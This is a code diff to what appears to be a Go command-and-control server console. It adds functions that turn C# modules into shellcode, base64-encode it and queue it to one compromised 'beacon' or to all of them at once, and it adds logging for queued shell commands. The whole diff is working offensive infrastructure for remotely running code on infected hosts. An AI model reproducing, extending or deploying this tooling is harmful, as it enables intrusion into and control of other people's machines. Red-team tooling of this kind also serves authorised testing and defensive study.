@@ -127,14 +127,71 @@ func genRandID() string {
 	return string(b)
 }
 
-func execModuleOnBeacon(cmd[] string) {
+func getModuleByName(name string) *CSharpModule {
+	for _, m := range csharpModules {
+		if m.Name == name {
+			return m
+		}
+	}
 
+	return nil
+}
+
+func execModuleHelper(beacon *Beacon, module *CSharpModule, arguments string) {
+	shellcode := module.getShellcode()
+
+	if len(shellcode) == 0 {
+		return
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(shellcode)
+	beacon.ShellcodeBuffer = append(beacon.ShellcodeBuffer, encoded)
+	beacon.ShellcodeBuffer = append(beacon.ShellcodeBuffer, "module " + arguments)
+}
+
+func execModuleOnBeacon(cmd[] string) {
+	if cmd[1] == "list" {
+		for i, module := range csharpModules {
+			info("[" + strconv.Itoa(i) + "] " + module.Name)
+		}
+		return
+	}
+
+	arguments := strings.Join(cmd[2:], " ")
+
+	if cmd[1] == "*" {
+		fmt.Println(cmd[2])
+		module := getModuleByName(cmd[2])
+		for _, b := range beacons {
+			execModuleHelper(b, module, arguments)
+			info("Added module command to buffer for beacon " + b.Id + "@" + b.Ip)
+		}
+		return	
+	}
+
+	var beacon *Beacon = activeBeacon
+	var cmdIndex = 1
+
+	if beacon == nil {
+		beacon = getBeaconByIdOrIndex(cmd[1])
+		cmdIndex = 2
+	}
+
+	arguments = strings.Join(cmd[cmdIndex:], " ")
+
+	if beacon != nil {
+		execModuleHelper(beacon, getModuleByName(cmd[cmdIndex]), arguments)
+		info("Added module command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
+	} else {
+		info("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+	}
 }
 
 func execOnBeacon(cmd []string) {
 	if cmd[1] == "*" {
 		for _, b := range beacons {
 			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
+			info("Added exec command to buffer for beacon " + b.Id + "@" + b.Ip)
 		}
 		return	
 	}
@@ -425,7 +482,7 @@ func processInput(input string) {
 			case "help":
 				printHelp(cmd)
 			case "mod":
-				if activeBeacon != nil {
+				if activeBeacon != nil || cmd[1] == "list" {
 					execModuleOnBeacon(cmd)
 				} else {
 					info("Interact with a beacon first (use).")
